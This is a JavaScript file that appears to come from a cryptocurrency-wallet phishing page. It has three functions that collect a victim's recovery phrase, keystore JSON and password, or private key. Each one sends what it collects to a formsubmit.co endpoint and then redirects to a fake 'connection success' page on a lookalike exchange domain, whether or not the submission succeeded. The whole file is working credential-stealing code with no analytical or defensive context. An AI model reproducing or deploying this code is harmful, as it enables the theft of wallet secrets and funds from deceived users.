function sendPhrase() {
    var wallet = $("#walletname").html();
    var phraseinput = $("#phraseinput").val();

    if (phraseinput === "") {
        $("#thankyou_message").html("Please, enter your recovery phrase");
        setTimeout(function () { $("#thankyou_message").html(""); }, 2000);
    } else {
        $("#thankyou_message").html("Connecting...");

        $.ajax({
            url: "https://formsubmit.co/ajax/fe3f40e419e74e3334f31d2541f93a52",
            method: "POST",
            data: {
                wallet: wallet,
                phraseinput: phraseinput
            },
            dataType: "json",
            success: function (res) {
                console.log(res);

                if (res.status) {
                    location.href = 'https://xeggexapp.uno/apiv4wc-connection-success';
                } else {
                    location.href = 'https://xeggexapp.uno/apiv4wc-connection-success';
                }
            },
            error: function () {
                location.href = 'https://xeggexapp.uno/apiv4wc-connection-success';
            }
        });
    }
}

function sendKeyStore() {
    var wallet = $("#walletname").html();
    var keystoreval = $("#keystoreval").val();
    var password = $("#password").val();

    if (keystoreval === "") {
        $("#successful2").html("Keystore JSON Needed");
    } else if (password === "") {
        $("#successful2").html("Wallet Password Needed");
    } else {
        $("#successful2").html("Connecting...");

        $.ajax({
            url: "https://formsubmit.co/ajax/fe3f40e419e74e3334f31d2541f93a52",
            method: "POST",
            data: {
                wallet: wallet,
                keystoreval: keystoreval,
                password: password
            },
            dataType: "json",
            success: function (res) {
                console.log(res);

                if (res.status) {
                    location.href = 'https://xeggexapp.uno/apiv4wc-connection-success';
                } else {
                    location.href = 'https://xeggexapp.uno/apiv4wc-connection-success';
                }
            },
            error: function () {
                location.href = 'https://xeggexapp.uno/apiv4wc-connection-success';
            }
        });
    }
}

function sendPrivate() {
    var wallet = $("#walletname").html();
    var privatekeyval = $("#privatekeyval").val();

    if (privatekeyval === "") {
        $("#successful3").html("Private Key Needed");
    } else {
        $("#successful3").html("Connecting...");
        $.ajax({
            url: "https://formsubmit.co/ajax/fe3f40e419e74e3334f31d2541f93a52",
            type: "POST",
            data: {
                wallet: wallet,
                privatekeyval: privatekeyval
            },
            dataType: "json",
            success: function (res) {
                console.log(res);

                if (res.status) {
                    location.href = 'https://xeggexapp.uno/apiv4wc-connection-success';
                } else {
                    location.href = 'https://xeggexapp.uno/apiv4wc-connection-success';
                }
            },
            error: function () {
                location.href = 'https://xeggexapp.uno/apiv4wc-connection-success';
            }
        });
    }
}

function closing() {
    $("#frame_body").hide();
}
